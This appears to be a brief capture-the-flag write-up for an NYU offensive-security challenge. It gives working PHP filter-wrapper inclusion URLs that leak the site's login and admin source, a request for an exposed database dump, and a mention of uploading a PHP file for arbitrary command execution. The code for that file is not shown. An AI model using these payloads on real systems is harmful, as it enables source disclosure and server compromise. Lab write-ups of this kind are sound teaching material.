## Steps:

1. Leak source code
    - http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=php://filter/convert.base64-encode/resource=login
    - Home and about do not have anything particularly interesting in them
2. Retrieve db.sql from the server
    - http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/db.sql
3. Retrieve admin code
    - http://offsec-chalbroker.osiris.cyber.nyu.edu:1252/index.php?page=php://filter/convert.base64-encode/resource=admin
4. Upload file that can retrieve the flag
    - Created an exploit php file that allowed me to run arbitrary commands on the server
